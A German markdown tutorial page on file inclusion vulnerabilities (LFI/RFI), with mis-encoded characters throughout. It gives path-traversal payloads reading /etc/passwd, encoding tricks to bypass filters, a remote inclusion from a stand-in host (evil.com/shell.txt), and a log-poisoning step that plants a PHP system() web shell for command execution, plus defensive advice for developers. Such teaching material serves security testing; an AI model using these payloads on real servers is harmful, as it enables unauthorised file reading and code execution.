Inhalt fÃ¼r web-pentesting/file-inclusion.md

# ğŸ“‚ File Inclusion (LFI / RFI)

File Inclusion ist eine Schwachstelle, bei der ein Angreifer die MÃ¶glichkeit hat, Dateien auf dem Server einzubinden und anzuzeigen (LFI) oder sogar externe Dateien aus dem Internet nachzuladen (RFI).

---

## ğŸ” Arten von File Inclusion

### ğŸ“Œ 1. LFI â€“ Local File Inclusion
- Eingebundene Datei stammt **vom selben Server**
- Zugriff auf `/etc/passwd`, Logfiles, Source-Code etc.
- Beispiel-URL:

?page=../../../../etc/passwd


### ğŸŒ 2. RFI â€“ Remote File Inclusion (seltener)
- Server lÃ¤dt externe Datei per URL
- Beispiel:

?page=http://evil.com/shell.txt

- Funktioniert nur bei schlecht konfigurierten Servern mit `allow_url_include = On`

---

## ğŸ§ª Testmethoden

### ğŸ”¹ Basis-Test:
```bash
?page=../../../../etc/passwd

ğŸ”¹ Filter umgehen:

?page=....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd

ğŸ”¹ Log Poisoning (z.â€¯B. bei LFI + Code Execution):

    User-Agent manipulieren:

User-Agent: <?php system($_GET['cmd']); ?>

    LFI auf /var/log/apache2/access.log

    Zugriff mit:

?page=/var/log/apache2/access.log&cmd=id

ğŸ§° Tools & Hilfen
Tool	Zweck
Burp Suite	Parameter testen, Input fuzzing
ffuf / wfuzz	Pfadfuzzing, Wordlists einsetzen
SecLists	Wordlists: LFI-LFI.txt, Unix-Paths
ğŸ›¡ï¸ SchutzmaÃŸnahmen (fÃ¼r Entwickler)

    Whitelisting erlaubter Dateien

    Keine dynamische Einbindung von User-Input

    Pfade auflÃ¶sen & validieren (realpath)

    allow_url_include deaktivieren (PHP)

ğŸ“š Weitere Infos & Payloads:
PayloadAllTheThings â€“ File Inclusion
